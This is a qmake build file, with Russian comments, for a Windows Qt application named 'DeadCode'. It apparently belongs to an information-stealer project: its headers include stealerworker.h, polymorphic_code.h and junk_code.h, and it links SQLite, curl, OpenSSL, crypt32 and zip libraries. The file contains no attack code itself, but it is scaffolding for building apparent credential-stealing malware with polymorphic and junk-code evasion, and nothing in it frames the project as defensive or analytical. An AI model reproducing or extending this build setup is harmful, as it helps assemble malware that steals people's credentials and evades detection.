# Основные модули Qt (синхронизированы с build.yml)
QT += core gui network widgets qml quick svg quickcontrols quickcontrols2 sql winextras qtdeclarative

# Проверка минимальной версии Qt
lessThan(QT_MAJOR_VERSION, 5) | lessThan(QT_MINOR_VERSION, 15) {
    error("Qt 5.15.2 or higher is required. Current version: $$QT_VERSION")
}

# Имя цели и тип приложения
TARGET = DeadCode
TEMPLATE = app

# Конфигурация для релиза (динамическая сборка Qt)
CONFIG += release

# Исходные файлы
SOURCES += \
    $$PWD/../src/main.cpp \
    $$PWD/mainwindow.cpp

# Заголовочные файлы
HEADERS += \
    $$PWD/mainwindow.h \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h \
    $$PWD/../src/stealerworker.h \
    $$PWD/../src/compat.h

# Формы Qt Designer
FORMS += \
    $$PWD/mainwindow.ui

# Файл ресурсов
RC_FILE = $$PWD/../icon.rc

# Пути для поиска заголовков
VCPKG_INCLUDE_DIR = $$(VCPKG_ROOT)/installed/x64-mingw-dynamic/include
isEmpty(VCPKG_INCLUDE_DIR):VCPKG_INCLUDE_DIR = C:/vcpkg/installed/x64-mingw-dynamic/include

QT_DIR = $$(QT_ROOT)
isEmpty(QT_DIR):QT_DIR = C:/Qt/5.15.2/win64_mingw73

INCLUDEPATH += \
    $$PWD/../src \
    $$PWD \
    $$VCPKG_INCLUDE_DIR \
    $$QT_DIR/include

# Пути для поиска QML-модулей (для Qt Creator и runtime через QML2_IMPORT_PATH в build.yml)
QML_IMPORT_PATH += \
    $$QT_DIR/qml

# Библиотеки для линковки (синхронизированы с build.yml и vcpkg)
VCPKG_LIB_DIR = $$(VCPKG_ROOT)/installed/x64-mingw-dynamic/lib
isEmpty(VCPKG_LIB_DIR):VCPKG_LIB_DIR = C:/vcpkg/installed/x64-mingw-dynamic/lib

LIBS += -L$$VCPKG_LIB_DIR \
    -lsqlite3 \
    -lzip \
    -lzlib \
    -lbz2 \
    -lcurl \
    -lssl \
    -lcrypto \
    -lstdc++fs \
    -lws2_32 \
    -lcrypt32 \
    -lgdi32 \
    -luser32 \
    -ladvapi32

# Флаги компилятора (синхронизированы с build.yml)
QMAKE_CXXFLAGS += \
    -O2 \
    -std=c++17 \
    -Wall \
    -Wextra \
    -Werror=return-type \
    -fexceptions \
    -DUNICODE \
    -D_UNICODE \
    -DWIN32 \
    -DQT_NO_DEBUG \
    -D_CRT_SECURE_NO_WARNINGS \
    -Wno-deprecated-declarations \
    -Wno-cast-function-type \
    -Wno-unused-parameter \
    -Wno-sign-compare \
    -Wno-attributes  # Явно указано в build.yml

# Флаги линковщика (синхронизированы с build.yml)
QMAKE_LFLAGS += \
    -O2 \
    -Wl,-subsystem,windows

# Директории для сборки
DESTDIR = $$PWD/../build/release
OBJECTS_DIR = $$PWD/../build/release
MOC_DIR = $$PWD/../build/release
UI_DIR = $$PWD/../build/release
RCC_DIR = $$PWD/../build/release

# Расширенный список файлов для очистки
QMAKE_CLEAN += \
    $$DESTDIR/* \
    $$OBJECTS_DIR/*.o \
    $$MOC_DIR/moc_*.cpp \
    $$UI_DIR/ui_*.h \
    $$RCC_DIR/qrc_*.cpp

# Зависимости для пересборки
PRE_TARGETDEPS += \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h \
    $$PWD/../src/stealerworker.h \
    $$PWD/../src/compat.h